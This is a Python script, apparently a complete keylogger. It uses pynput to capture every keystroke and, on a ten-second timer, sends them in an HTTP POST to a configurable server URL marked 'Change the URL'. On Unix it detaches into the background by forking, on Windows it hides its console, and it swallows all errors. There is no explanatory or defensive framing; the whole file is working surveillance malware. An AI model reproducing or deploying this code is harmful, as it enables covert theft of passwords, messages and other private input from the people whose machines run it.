import pynput
from pynput.keyboard import Key, Listener
import requests
import os
import threading

count = 0
keys = []
timer_interval = 10  # Keystroke timer can be changed here

def on_press(key):
    global keys, count
    
    if key == Key.enter:
        keys.append('\n')
    elif key == Key.space:
        keys.append(' ')
    elif isinstance(key, Key):
        keys.append(f'<{key.name}>')
    else:
        keys.append(key.char)
    
    count += 1

def send_to_server():
    global keys
    
    if keys:
        data = {"keys": ''.join(keys)}
        try:
            requests.post("http://0.0.0.0:8080/keystrokes", data=data) # Change the URL
        except:
            pass  
        
        keys = []
    
    threading.Timer(timer_interval, send_to_server).start()

def on_release(key):
    if key == Key.esc:
        return False

def start_listener():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    try:
        if os.name == 'posix':
            if os.fork():
                os._exit(0)
        elif os.name == 'nt':
            from ctypes import windll
            windll.kernel32.FreeConsole()

        send_to_server()
        start_listener()
    except:
        pass  

